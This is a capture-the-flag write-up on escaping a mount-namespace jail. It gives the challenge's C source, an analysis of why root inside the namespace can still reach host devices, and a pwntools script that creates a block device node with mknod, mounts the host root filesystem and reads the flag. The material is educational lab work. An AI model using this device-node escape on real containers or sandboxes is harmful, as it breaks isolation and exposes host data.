#metadata(
  (
    title: "Mount Namespace Escape via Device Node Hijack",
    description: "Escaping a mount namespace sandbox by creating and mounting a block device node for the host's root filesystem, bypassing filesystem-level nodev restrictions.",
    date: "2025-12-30",
    order: 15,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Mount Namespace Escape via Device Node Hijack

== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

#include <sys/syscall.h>
#include <sys/mount.h>
#include <dirent.h>
#include <limits.h>
#include <sched.h>

char hostname[128];

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    for (int i = 3; i < 10000; i++) close(i);

    char new_root[] = "/tmp/jail-XXXXXX";
    char old_root[PATH_MAX];

    assert(geteuid() == 0);

    assert(unshare(CLONE_NEWNS) != -1);

    // create the new root
    assert(mkdtemp(new_root) != NULL);

    // change the old root (/) to a private mount so that pivot_root succeeds
    assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);

    // bind-mount the new root over itself
    assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);

    // create a directory in which pivot_root will put the old root filesystem
    snprintf(old_root, sizeof(old_root), "%s/old", new_root);
    assert(mkdir(old_root, 0777) != -1);

    // pivot the root filesystem
    assert(syscall(SYS_pivot_root, new_root, old_root) != -1);

    assert(mkdir("/bin", 0755) != -1);
    assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);

    assert(mkdir("/usr", 0755) != -1);
    assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);

    assert(mkdir("/lib", 0755) != -1);
    assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);

    assert(mkdir("/lib64", 0755) != -1);
    assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);

    // unmount old root directory
    assert(umount2("/old", MNT_DETACH) != -1);
    assert(rmdir("/old") != -1);

    // make things simpler for everyone to avoid strange behavior with permissions
    setresuid(0, 0, 0);

    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "try harder", 10);
    close(fffd);

    assert(execl("/bin/bash", "/bin/bash", "-p", NULL) != -1);
}

```

== Vulnerability Analysis

This challenge improves on the previous level by properly unmounting the old root filesystem (`/old`) after the pivot.

```c
assert(umount2("/old", MNT_DETACH) != -1);
```

However, we are still running as `root` inside the container. Since the container shares the same kernel as the host, we can create a block device node corresponding to the host's storage device.

Although the `chroot` environment might be mounted with `nodev` (disallowing device interpretation), the bind mounts (`/bin`, `/usr`) typically retain the properties of the underlying filesystem (the host's root), which allows devices.

== Exploitation Plan

1.  **Identify Host Device:** Check `/proc/self/mountinfo` (or `/p/self/mountinfo` if we need to mount proc) to find the major/minor numbers of the host's root filesystem.
2.  **Create Device Node:** Use `mknod` to create a block device file representing the host's disk. We create this inside `/bin` (e.g., `/bin/disk`) because `/bin` is bind-mounted from the host and permits device execution.
3.  **Mount Host Root:** Mount this new device node to a directory (e.g., `/mnt`).
4.  **Read Flag:** The host's filesystem is now accessible at `/mnt`. Read `/mnt/flag`.

== Exploit Script

```python
from pwn import *

exe = "./challenge"
context.binary = exe

p = process(exe)

# Commands to be executed inside the shell
commands = """
# 1. Mount proc to find device info
mkdir -p /tmp/p
mount -t proc none /tmp/p

# 2. Parse mountinfo to find the root device's major:minor
# (Assumes the root mount line looks like "... / / ...")
# We just grep for it or guess. Common major:minor for root is often 8:1 (sda1) or 259:X (nvme).
# For this script, we'll try to extract it automatically or hardcode if known.
DEV=$(grep ' / / ' /tmp/p/self/mountinfo | cut -d' ' -f3)
MAJOR=$(echo $DEV | cut -d':' -f1)
MINOR=$(echo $DEV | cut -d':' -f2)

echo "Found device: $MAJOR:$MINOR"

# 3. Create the device node in /bin (writable and executable)
mknod /bin/host_disk b $MAJOR $MINOR

# 4. Mount the host disk
mkdir -p /tmp/host_root
mount /bin/host_disk /tmp/host_root

# 5. Read the flag
cat /tmp/host_root/flag
"""

p.sendline(commands.encode())
print(p.recvall().decode())
```
